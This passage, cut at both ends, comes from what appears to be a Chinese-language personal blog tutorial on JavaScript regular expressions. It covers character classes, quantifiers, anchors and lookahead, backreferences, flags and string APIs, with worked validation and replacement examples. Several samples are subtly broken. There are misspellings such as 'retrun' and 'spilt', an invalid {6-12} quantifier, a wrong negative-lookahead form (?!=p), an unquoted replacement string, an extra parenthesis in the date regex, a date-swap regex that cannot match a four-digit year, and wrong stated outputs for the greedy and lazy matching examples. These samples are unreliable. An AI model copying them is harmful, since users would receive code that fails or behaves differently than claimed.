word</td></tr><tr><td>匹配空白符，包括空格、制表符、换行符和换页符</td><td style="text-align:center">\s</td><td style="text-align:right">space</td></tr><tr><td>匹配非空白字符</td><td style="text-align:center">\S</td><td style="text-align:right">not space    </td></tr><tr><td>匹配任意字符</td><td style="text-align:center">[\d\D]、[\w\W]、[\s\S]</td><td style="text-align:right"></td></tr></tbody></table><p><br></p><h4 id="1-3-量词"><a href="#1-3-量词" class="headerlink" title="1.3 量词"></a>1.3 量词</h4><p>多次循环，重复上面的正则规则，就可以匹配匹配多个字符。</p><table><thead><tr><th>符号</th><th style="text-align:center">重复次数</th><th style="text-align:center">例子</th><th style="text-align:right"></th></tr></thead><tbody><tr><td>?</td><td style="text-align:center">0次或1次</td><td style="text-align:center">/colour?/</td><td style="text-align:right">匹配colou和colour两个单词</td></tr><tr><td>+</td><td style="text-align:center">1次或多次</td><td style="text-align:center">/color+/</td><td style="text-align:right">匹配color, colorr, colorrr…</td></tr><tr><td>{n}</td><td style="text-align:center">区间次数</td><td style="text-align:center">/a{3}/</td><td style="text-align:right">连续出现a 3次</td></tr><tr><td>{min,max}</td><td style="text-align:center">min到max次</td><td style="text-align:center">/a{1,2}/</td><td style="text-align:right">连续出现a 1-2次</td></tr><tr><td>{min,}</td><td style="text-align:center">至少min次</td><td style="text-align:center">/a{1,}/</td><td style="text-align:right">连续出现a至少1次</td></tr><tr><td>{0, max}</td><td style="text-align:center">最多max次</td><td style="text-align:center">/a{0,3}/</td><td style="text-align:right">连续出现a最多3次</td></tr><tr><td>*</td><td style="text-align:center">匹配0个字符或无数个字符</td><td style="text-align:center">/*/</td><td style="text-align:right">用来过滤可有可无的字符串</td></tr></tbody></table><p><br></p><h4 id="1-5-位置符"><a href="#1-5-位置符" class="headerlink" title="1.5 位置符"></a>1.5 位置符</h4><p>位置是相邻字符之间的位置。<br><img src="/2019/06/10/正则表达式/1.png" style="max-width: 300px"></p><table><thead><tr><th>符号</th><th style="text-align:center">含义</th><th style="text-align:center">例子</th><th style="text-align:right"></th></tr></thead><tbody><tr><td>\b</td><td style="text-align:center">单词边界,\w和\W之间的位置,也包括\w和^,\w和$之间的位置</td><td style="text-align:center">/\bcat\b/</td><td style="text-align:right">匹配cat，匹配不到scattered</td></tr><tr><td>^</td><td style="text-align:center">匹配开头，在多行匹配中匹配开头</td><td style="text-align:center">/^I am/</td><td style="text-align:right">以I am开头的字符串</td></tr><tr><td>$</td><td style="text-align:center">匹配结尾，在多行匹配中匹配结尾</td><td style="text-align:center">/^I am good.$/</td><td style="text-align:right">匹配I am good这个句子</td></tr><tr><td>(?=p)</td><td style="text-align:center">p是一个子模式，表示p前面的位置</td><td style="text-align:center">/(?=l)/g</td><td style="text-align:right">所有l前面的位置</td></tr><tr><td>(?!=p)</td><td style="text-align:center">(?=p)的反面意思</td><td style="text-align:center"></td><td style="text-align:right"></td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/^|$/g</span>, <span class="string">'#'</span>)              <span class="comment">// "#hello#"</span></span><br><span class="line"><span class="string">"[JS] lesson_01.mp4"</span>.replace(<span class="regexp">/\b/g</span>, <span class="string">'#'</span>)  <span class="comment">// "[#JS#] #lesson_01#.#mp4#"</span></span><br><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/(?=l)/g</span>, <span class="string">"#"</span>)            <span class="comment">// "he#l#lo"</span></span><br><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/(?!=l)/g</span>, <span class="string">"#"</span>)           <span class="comment">// "#h#ell#o#"</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-分组-回溯引用"><a href="#1-4-分组-回溯引用" class="headerlink" title="1.4 分组,回溯引用"></a>1.4 分组,回溯引用</h4><p><em>()</em> 表示一个分组，只是使用简单的(regex)本质上和不分组是一样的，要发挥它强大的作用，要结合回溯引用。</p><p><em><code>\1, \2....</code></em> 表示引用的第1,2个子表达式… <em><code>\0</code></em> 表示整个表达式。<strong>回溯引用</strong> 指后面引用前面已经匹配到的子字符串。</p><p><em><code>$1, $2...</code></em> 用于引用要被替换的字符串<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/\b(\w)+\s\1/</span>   <span class="comment">// 匹配两个连续相同的单词</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'abc abc 123'</span>;</span><br><span class="line">str.replace(<span class="regexp">/(ab)c/g</span>, <span class="string">'$1g'</span>); <span class="comment">// 'abg abg 123'</span></span><br></pre></td></tr></table></figure></p><p><em><code>$&amp;</code></em> 匹配子串文本<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// '2,3,5'变成'222,333,555'</span></span><br><span class="line"><span class="string">"2,3,5"</span>.replace(<span class="regexp">/(\d)+/g</span>, $&amp;$&amp;$&amp;);  <span class="comment">// 222,333,555</span></span><br></pre></td></tr></table></figure></p><p><em><code>(?:regex)</code></em>，如果我们不想子表达式被引用，可以用<strong>非捕获正则</strong>, 这样可以避免浪费内存。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'scq000'</span>;</span><br><span class="line">str.replace(<span class="regexp">/(scq00)(?:0)/</span>, <span class="string">'$1,$2'</span>);  <span class="comment">// 'scq00,$2'</span></span><br><span class="line"><span class="comment">// 使用了非捕获正则，所以第二个引用没有值，这里直接替换为$2</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-5-逻辑处理"><a href="#1-5-逻辑处理" class="headerlink" title="1.5 逻辑处理"></a>1.5 逻辑处理</h4><table><thead><tr><th>逻辑关系</th><th style="text-align:right">正则表达式</th></tr></thead><tbody><tr><td>与</td><td style="text-align:right">无             </td></tr><tr><td>非</td><td style="text-align:right">[^regex] 和 !  </td></tr><tr><td>或</td><td style="text-align:right">&#124;</td></tr></tbody></table><p><br></p><h4 id="1-6-修饰符"><a href="#1-6-修饰符" class="headerlink" title="1.6 修饰符"></a>1.6 修饰符</h4><p>修饰符放在了<code>/regex/img</code>正则表达式的最后面。</p><table><thead><tr><th>修饰符</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>m</td><td style="text-align:center">多行匹配 multiline</td></tr><tr><td>i</td><td style="text-align:center">忽略大小写 ignore       </td></tr><tr><td>g</td><td style="text-align:center">全局匹配global， 在目标字符串中按顺序找到满足匹配模式的所有子串</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/ab&#123;2,4&#125;c/g</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"abc abbc abbbc abbbbc abbbbbc"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(string.match(regex));</span><br><span class="line"><span class="comment">// ["abbc", "abbbc", "abbbbc"]</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-正则表达式-JS"><a href="#2-正则表达式-JS" class="headerlink" title="2. 正则表达式 + JS"></a>2. 正则表达式 + JS</h3><p>有了正则表达式进行匹配，结合JS api，我们可以完成验证、切分、提取、替换的动作。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.search(regex)</span><br><span class="line"><span class="built_in">String</span>.split(regex)</span><br><span class="line"><span class="built_in">String</span>.match(regex)</span><br><span class="line"><span class="built_in">String</span>.replace(regex, newText)</span><br><span class="line"><span class="built_in">RegExp</span>.test(string)</span><br><span class="line"><span class="built_in">RegExp</span>.exec(string)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-1-验证"><a href="#2-1-验证" class="headerlink" title="2.1 验证"></a>2.1 验证</h4><p>判断有没有匹配上<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断一个字符串中有没有数字</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d/</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"abc123"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最常用的是test</span></span><br><span class="line"><span class="built_in">console</span>.log(regex.test(string));        <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-切分"><a href="#2-2-切分" class="headerlink" title="2.2 切分"></a>2.2 切分</h4><p>把目标字符串，切成一段一段 <code>string.split(regex)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 日期格式切除年月日</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\D/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017-01-01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017.01.01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017/01/01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-提取"><a href="#2-3-提取" class="headerlink" title="2.3 提取"></a>2.3 提取</h4><p>提取匹配到的数据<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^(\d&#123;4&#125;)\D(\d&#123;2&#125;)\D(\d&#123;2&#125;))$/</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"2017-06-26"</span>;</span><br><span class="line">string.match(regex); </span><br><span class="line"><span class="comment">// [$0, $1, $2 ... , index, input]</span></span><br><span class="line"><span class="comment">//  =&gt;["2017-06-26", "2017", "06", "26", index: 0, input: "2017-06-26"]</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-替换"><a href="#2-4-替换" class="headerlink" title="2.4 替换"></a>2.4 替换</h4><p><code>string.replace(regex, newtext)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将yyyy-mm-dd替换成yyyy/mm/dd</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"2017-06-26"</span>;</span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>( string.replace(<span class="regexp">/\-/g</span>, <span class="string">"/"</span>))</span><br><span class="line"><span class="built_in">console</span>.log(today)  <span class="comment">// =&gt; Mon Jun 26 2017 00:00:00 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-匹配原理"><a href="#3-匹配原理" class="headerlink" title="3. 匹配原理"></a>3. 匹配原理</h3><h4 id="3-1-回溯"><a href="#3-1-回溯" class="headerlink" title="3.1 回溯"></a>3.1 回溯</h4><p>后补</p><h4 id="3-2-操作符优先级"><a href="#3-2-操作符优先级" class="headerlink" title="3.2 操作符优先级"></a>3.2 操作符优先级</h4><p>优先级从上至下，由高到低</p><ul><li>转义符 \</li><li>括号和方括号 (…)、(?:…)、(?=…)、(?!…)、[…]</li><li>量词限定符 {m}、{m,n}、{m,}、?、*、+</li><li>位置和序列 ^ 、$、 \元字符、 一般字符</li><li>管道符（竖杠）|</li></ul><h4 id="3-3-优化效率"><a href="#3-3-优化效率" class="headerlink" title="3.3 优化效率"></a>3.3 优化效率</h4><p>后补</p><p><br></p><h3 id="4-例子"><a href="#4-例子" class="headerlink" title="4. 例子"></a>4. 例子</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/hello/</span>;</span><br><span class="line">regex.test(<span class="string">"hello"</span>);  </span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/ab&#123;1,2&#125;c/g</span>;</span><br><span class="line"><span class="string">"abc abbc abbbc"</span>.match(regex); </span><br><span class="line"><span class="comment">// ["abc", "abbc"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/a[123]b/g</span>;</span><br><span class="line"><span class="string">"a0b a1b a4b"</span>.match(regex); </span><br><span class="line"><span class="comment">// ["a1b"];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配2-3位数</span></span><br><span class="line"><span class="comment">// 筛选数组中的三位数 arr.join(" ").match(/d&#123;3&#125;/g)</span></span><br><span class="line"><span class="comment">// 贪婪匹配，尽可能多的匹配</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;2,5&#125;/g</span>;</span><br><span class="line"><span class="string">"123 1234 12356 123456"</span>.match(regex);  </span><br><span class="line"><span class="comment">// ["123", "1234", "1234", "12345"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 惰性匹配，尽可能少的匹配</span></span><br><span class="line"><span class="comment">// 在量词后面加个问号能实现惰性匹配 &#123;m,n&#125;?   &#123;m,&#125;?   ??   +?  *?  </span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;2,3&#125;?/g</span></span><br><span class="line"><span class="string">"123 1234 12356 123456"</span>.match(regex);  </span><br><span class="line"><span class="comment">// ["12", "12", "34", "12", "34", "12", "34", "56"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// (p1|p2|p3)分支结构是惰性的，前面的匹配上了，后面的就不再尝试</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/good|goodbye/g</span>;   <span class="comment">// ["good"]</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/goodbye|good/g</span>;   <span class="comment">// ["goodbye"]</span></span><br><span class="line"><span class="string">"goodbye"</span>.match(regex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配16进制颜色值, [0-9a-fA-F]出现3或6次</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/#([0-9a-fA-F]&#123;3&#125;|[0-9a-fA-F]&#123;6&#125;)/g</span>;;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"#ffbbad #FC01df #fff"</span>;  </span><br><span class="line"><span class="comment">// ["#ffbbad","#FC01df","#fff"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配时间</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^([01][0-9]|[2][0-3]):([0-5][0-9])$/</span>;</span><br><span class="line">regex.test(<span class="string">"23:59"</span>)</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配日期</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/</span></span><br><span class="line">regex.test(<span class="string">"2019-01-02"</span>);</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 把yyyy-mm-dd格式替换成mm/dd/yyyy</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/(\d&#123;2&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/</span>;</span><br><span class="line"><span class="string">"2019-01-02"</span>.replace(regex, <span class="string">"$2/$3/$1"</span>);</span><br><span class="line"><span class="comment">// "01/02/2019"， 等价于</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="string">"2019-01-02"</span>.replace(regex, <span class="function"><span class="keyword">function</span>(<span class="params">match, year, month, day</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> month + <span class="string">"/"</span> + day + <span class="string">"/"</span> + year;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配2016-01-02 2016/01/01 2016.01.02三种格式，确保前后分隔符一致</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;4&#125;(-|/</span>|.)\d&#123;<span class="number">2</span>&#125;\<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;/;</span><br><span class="line">regex.test(string);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配windows操作系统文件路径</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[a-zA-Z]:\\([^\\:*&lt;&gt;|"?\r\n/]+\\)*([^\\:*&lt;&gt;|"?\r\n/]+)?$/</span>;</span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript\\regex\\regular expression.pdf"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript\\regex\\"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\"</span>) ); </span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配id值</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/id=".*"/</span>;      <span class="comment">// id="container" class="main"</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/id="[^"]*"/</span>;   <span class="comment">// id="container"</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">'&lt;div id="container" class="main"&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字千分位分隔符</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/(?!^)(?=(\d&#123;3&#125;)+$)/</span>;</span><br><span class="line"><span class="string">"12345678"</span>.replace(regex, <span class="string">','</span>)  <span class="comment">// 12,345,678</span></span><br><span class="line"><span class="string">"123456789"</span>.replace(regex, <span class="string">','</span>) <span class="comment">// 123,456,789</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 密码 6-12位 多重规则应拆开写</span></span><br><span class="line"><span class="comment">// 1. 同时包含数字和小写字母 </span></span><br><span class="line"><span class="comment">// 2. 同时包含数字和大写字母 </span></span><br><span class="line"><span class="comment">// 3. 同时包含小写字母和大写字母 </span></span><br><span class="line"><span class="comment">// 4. 同时包含数字、小写字母和大写字母</span></span><br><span class="line"><span class="keyword">var</span> regex1 = <span class="regexp">/^[0-9a-z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex2 = <span class="regexp">/^[0-9A-Z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex3 = <span class="regexp">/^[a-zA-Z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex4 = <span class="regexp">/^[0-9a-zA-Z]&#123;6-12&#125;$/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配浮点数</span></span><br><span class="line"><span class="comment">// 10  +10  -10  1.23  +1.23  -1.23  .2  +.2  -.2</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[+-]?(\d+|\d+\.\d+|.\d+)$/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串trim模拟</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将每个单词的首字母转为大写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">titleize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  retrun str.toLowerCase().replace(<span class="regexp">/(?:^|\s)\w/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c.toUpperCase();</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">titleize(<span class="string">"my name is amy"</span>)   <span class="comment">// "My Name Is Amy"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驼峰化 </span></span><br><span class="line"><span class="comment">// ?的目的，为了应对str尾部的字符可能不是单词字符 "-moz-transform  "</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">camelize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/[-_\s]+(.)?/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">match, c</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c ? c.toUpperCase() : <span class="string">''</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中划线化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dasherize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/([A-Z])/g</span>, <span class="string">'-$1'</span>).replace(<span class="regexp">/[-_/s]+/g</span>, <span class="string">'-'</span>).toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// html转义和反转义</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unescapeHTML</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> htmlEntities = &#123;</span><br><span class="line">    lt: <span class="string">'&lt;'</span>,</span><br><span class="line">  gt: <span class="string">'&gt;'</span>,</span><br><span class="line">  nbsp: <span class="string">' '</span>,</span><br><span class="line">  cent: <span class="string">'¢'</span>,</span><br><span class="line">  pound: <span class="string">'£'</span>,</span><br><span class="line">  yen: <span class="string">'¥'</span>,</span><br><span class="line">  euro: <span class="string">'€'</span>,</span><br><span class="line">  copy: <span class="string">'©'</span>,</span><br><span class="line">  reg: <span class="string">'®'</span>,</span><br><span class="line">  quot: <span class="string">'"'</span>,</span><br><span class="line">  amp: <span class="string">'&amp;'</span>,</span><br><span class="line">  apos: <span class="string">'\''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/\(&amp;[^;]+);/</span>, <span class="function"><span class="keyword">function</span>(<span class="params">match, key</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (key <span class="keyword">in</span> htmlEntities) &#123;</span><br><span class="line">      <span class="keyword">return</span> htmlEntities[key]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> match;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">unescapeHTML(<span class="string">'&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt'</span>); <span class="comment">// "&lt;div&gt;Blah blah blah&lt;/div&gt;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 符合 成对标签 格式</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/&lt;([^&gt;]+)&gt;[\d\D]*&lt;\/\1&gt;/</span>; </span><br><span class="line">regex.test(<span class="string">"&lt;title&gt;wrong!&lt;/p&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 保证只有中文</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[\u4e00-\u9fa5]+$/ig</span>;</span><br><span class="line">regex.test(<span class="string">'中文'</span>) <span class="comment">// true</span></span><br><span class="line">regex.test(<span class="string">'中a'</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-没有必要用正则的情况"><a href="#5-没有必要用正则的情况" class="headerlink" title="5. 没有必要用正则的情况"></a>5. 没有必要用正则的情况</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从日期中提取年月日</span></span><br><span class="line"><span class="string">"2017-01-02"</span>.spilt(<span class="string">'-'</span>)   <span class="comment">// ["2017", "01", "02"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否有问号</span></span><br><span class="line"><span class="string">"123?123"</span>.indexOf(<span class="string">'?'</span>)   <span class="comment">// 3</span></span><br><span class="line"><span class="string">"123"</span>.indexOf(<span class="string">'?'</span>)       <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取子串</span></span><br><span class="line"><span class="string">"JavaScript"</span>.substring(<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a 